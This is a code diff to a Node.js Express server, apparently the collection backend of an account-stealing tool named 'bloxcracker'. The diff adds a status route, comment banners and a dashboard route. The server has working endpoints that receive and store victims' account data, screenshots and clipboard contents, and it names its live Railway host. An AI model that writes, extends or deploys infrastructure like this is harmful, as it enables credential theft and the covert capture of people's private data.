@@ -58,9 +58,34 @@ function writeData(data) {
     fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
 }
 
+// ============================================
+// ✅ ROOT ROUTE - UNTUK TEST
+// ============================================
+
+app.get('/', (req, res) => {
+    res.json({
+        status: '✅ Server is running!',
+        version: '1.0.0',
+        endpoints: {
+            'GET /api/accounts': 'Get all accounts',
+            'POST /api/account': 'Save account data',
+            'GET /api/account/:id': 'Get single account',
+            'DELETE /api/account/:id': 'Delete account',
+            'GET /api/stats': 'Get statistics',
+            'POST /api/screenshot': 'Upload screenshot',
+            'POST /api/clipboard': 'Save clipboard data'
+        },
+        totalAccounts: readData().accounts.length
+    });
+});
+
+// ============================================
 // 📡 RECEIVE ACCOUNT DATA
+// ============================================
+
 app.post('/api/account', async (req, res) => {
     try {
+        console.log('📥 Received account data');
         const accountData = req.body;
         const data = readData();
         
@@ -75,14 +100,12 @@ app.post('/api/account', async (req, res) => {
         );
         
         if (existingIndex !== -1) {
-            // Update akun existing
             data.accounts[existingIndex] = {
                 ...data.accounts[existingIndex],
                 ...accountData,
                 updatedAt: new Date().toISOString()
             };
         } else {
-            // Tambah akun baru
             data.accounts.push({
                 ...accountData,
                 createdAt: new Date().toISOString()
@@ -118,7 +141,10 @@ app.post('/api/account', async (req, res) => {
     }
 });
 
+// ============================================
 // 📸 RECEIVE SCREENSHOT
+// ============================================
+
 app.post('/api/screenshot', upload.single('screenshot'), async (req, res) => {
     try {
         const { metadata } = req.body;
@@ -149,7 +175,10 @@ app.post('/api/screenshot', upload.single('screenshot'), async (req, res) => {
     }
 });
 
+// ============================================
 // 📋 RECEIVE CLIPBOARD
+// ============================================
+
 app.post('/api/clipboard', async (req, res) => {
     try {
         const clipboardData = req.body;
@@ -171,7 +200,10 @@ app.post('/api/clipboard', async (req, res) => {
     }
 });
 
+// ============================================
 // 📊 GET ALL ACCOUNTS
+// ============================================
+
 app.get('/api/accounts', (req, res) => {
     try {
         const data = readData();
@@ -186,7 +218,10 @@ app.get('/api/accounts', (req, res) => {
     }
 });
 
+// ============================================
 // 🔍 GET SINGLE ACCOUNT
+// ============================================
+
 app.get('/api/account/:id', (req, res) => {
     try {
         const data = readData();
@@ -202,7 +237,10 @@ app.get('/api/account/:id', (req, res) => {
     }
 });
 
+// ============================================
 // 🗑️ DELETE ACCOUNT
+// ============================================
+
 app.delete('/api/account/:id', (req, res) => {
     try {
         const data = readData();
@@ -223,7 +261,10 @@ app.delete('/api/account/:id', (req, res) => {
     }
 });
 
+// ============================================
 // 📈 GET STATS
+// ============================================
+
 app.get('/api/stats', (req, res) => {
     try {
         const data = readData();
@@ -237,13 +278,25 @@ app.get('/api/stats', (req, res) => {
     }
 });
 
-// 🏠 Serve dashboard
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
+// ============================================
+// 🏠 DASHBOARD HTML (jika ada)
+// ============================================
+
+app.get('/dashboard', (req, res) => {
+    const htmlPath = path.join(__dirname, 'public', 'dashboard.html');
+    if (fs.existsSync(htmlPath)) {
+        res.sendFile(htmlPath);
+    } else {
+        res.json({ message: 'Dashboard HTML not found, create public/dashboard.html' });
+    }
 });
 
-// Start server
+// ============================================
+// 🚀 START SERVER
+// ============================================
+
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Dashboard running at http://0.0.0.0:${PORT}`);
-    console.log(`📊 Open http://localhost:${PORT} to view dashboard`);
+    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`📊 Test: https://bloxcracker.up.railway.app/`);
+    console.log(`📊 Accounts: https://bloxcracker.up.railway.app/api/accounts`);
 });
